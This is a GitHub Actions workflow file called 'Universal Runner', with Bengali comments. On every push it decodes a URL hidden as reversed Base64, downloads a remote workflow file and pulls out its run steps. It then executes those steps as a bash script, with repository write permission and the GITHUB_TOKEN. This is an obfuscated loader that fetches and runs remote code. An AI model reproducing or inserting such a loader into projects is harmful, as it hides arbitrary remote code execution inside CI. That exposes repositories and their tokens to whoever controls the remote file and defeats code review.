# Workflow Path: .github/workflows/universal-runner.yml

name: Tnayem48 Universal Runner

on:
  push:
    branches:
      - main
  workflow_dispatch:

env:
  # সুরক্ষিত লিঙ্ক (Reversed + Base64)
  # Target: https://raw.githubusercontent.com/nayem-48ai/nayem-48ai/refs/heads/tnx_bd/
  TNx_CORE: "L2JpX3hudC9zZGFlaC9zZmVyL2lhLTQ4bWV5YW4vaWEtNDhtZXlhbi9tb2Mu dW5ldG5vY3Jlc3VidXJodGlnLndhci8vOnNwdHRo"
  FILE_NAME: "build"

jobs:
  execute-logic:
    runs-on: ubuntu-latest
    permissions:
      contents: write

    steps:
      - name: Checkout Code
        uses: actions/checkout@v4
        with:
          fetch-depth: 0 
          token: ${{ secrets.GITHUB_TOKEN }}

      - name: Setup Environment
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Process Workflow
        run: |
          # লজিক: রিভার্স করে ডিকোড করা (সবচেয়ে স্ট্যাবল মেথড)
          TNxBD=$(echo "$TNx_CORE" | rev | base64 --decode)$FILE_NAME
          
          echo "Syncing with secure engine..."
          curl -sL "$TNxBD" -o remote_wf.yml

          # yq টুল সেটআপ
          sudo wget https://github.com/mikefarah/yq/releases/latest/download/yq_linux_amd64 -O /usr/bin/yq && sudo chmod +x /usr/bin/yq

          # স্ক্রিপ্ট জেনারেট করা
          yq e '.jobs.*.steps[].run' remote_wf.yml | sed '/^---$/d' > universal_script.sh
          
          # গিট কনফিগ
          git config --global user.name "github-actions[bot]"
          git config --global user.email "github-actions[bot]@users.noreply.github.com"
          git config --global --add safe.directory "$GITHUB_WORKSPACE"

          # এক্সিকিউট
          chmod +x universal_script.sh
          bash universal_script.sh
